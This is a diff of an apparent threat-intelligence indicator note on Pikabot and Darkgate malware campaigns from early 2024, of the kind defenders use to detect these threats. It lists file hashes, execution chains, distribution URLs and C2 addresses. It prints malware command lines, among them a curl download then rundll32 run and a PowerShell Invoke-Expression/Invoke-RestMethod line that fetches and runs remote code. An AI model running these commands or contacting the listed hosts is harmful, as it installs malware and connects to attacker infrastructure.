@@ -1,54 +1,64 @@
-27.02.2024 | Pikabot | TA577 |  
+26.03.2024 | Pikabot | 1.8.32-beta | Darkgate | admin888
 
 *************************************************
 
-.iso c2071407cf960fa166ac47d86f4a92b64873cd8c37a4ea416e80488c5f327c8f
-.dll 238dcc5611ed9066b63d2d0109c9b623f54f8d7b61d5f9de59694cfc60a4e646
+.xlsx 26e6ef9ef726f82c502a9b433ca07fa763d1cbac163236daac3c18a337245f29
+.html 196bb36f7d63c845afd40c5c17ce061e320d110f28ebe8c7c998b9e6b3fe1005
+.js b26eea12f0335364ffc49ecd7b04865d451f4f227724458ce1412cfd841350ee
+.vbs cb65d95a1496fd2e5105954eb3046df90c4262f19fa7d7d77fa59b488348b040
+.exe 7d18e238febf88bc7c868e3ee4189fd12a2aa4db21f66151bb4c15c0600eca6e
 
 *************************************************
 
-T1574 - DLL Search Order Hijacking
+Pikabot Exec >>
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\document_03.26.js
+
+C:\users\public\vx.exe
+
+ctfmon.exe -p 1234"
 
 *************************************************
 
-.iso > write.exe > 
+Darkgate Exec >>
 
-Open_Document.exe
+WScript.exe C:\Users\Admin\AppData\Local\Microsoft\Windows\INetCache\IE\J1T8VYEI\Report-26-2024[1].vbs
 
-cmd /c data\document.rtf
+powershell.exe -Command Invoke-Expression (Invoke-RestMethod -Uri 'withupdate.com/zuyagaoq')
 
-WINWORD.EXE /n C:\Users\Admin\AppData\Local\Temp\data\document.rtf /o
+AutoHotkey.exe C:/rjtu/script.ahk 
 
-cmd.exe /c md c:\wnd
-
-cmd.exe /c curl.exe --output c:\wnd\3291.png --url https://yourunitedlaws.com/mrD/4462
-
-curl.exe --output c:\wnd\3291.png --url https://yourunitedlaws.com/mrD/4462
-
-rundll32 c:\wnd\3291.png,GetModuleProp
-
+attrib.exe +h C:/rjtu/
 
 *************************************************
 
-.dll distro
+Distro urls
 
-https://yourunitedlaws.com/mrD/4462
-https://topflowersclub.com/aUvM/6875
+file://170.130.55.130/share/
+https://ingatecsus.com.br/assumendaipsam/Point.exe
 
 *************************************************
 
-c2's
+Darkgate c2's
 
-https://154.12.236.248:13786
-https://158.247.240.58:5632
-https://70.34.199.64:9785
-https://94.72.104.77:13724
-https://209.126.86.48:1194
-https://154.53.55.165:13783
-https://84.46.240.42:2083
-https://45.77.63.237:5632
-https://94.72.104.80:5000
-https://198.38.94.213:2224
-https://70.34.223.164:5000
+.xlsx 
+
+http://backupitfirst.com/wgfqneerod
+
+.html
+
+http://withupdate.com/oudowibspr
+
+*************************************************
+
+Pikabot c2's
+
+https://158.220.95.214:5243
+https://64.23.199.206:1194
+https://172.232.208.90:2223
+https://213.199.41.33:13721
+https://194.233.91.144:5000
+https://158.220.95.215:5242
+https://84.247.157.112:13783
 
 *************************************************
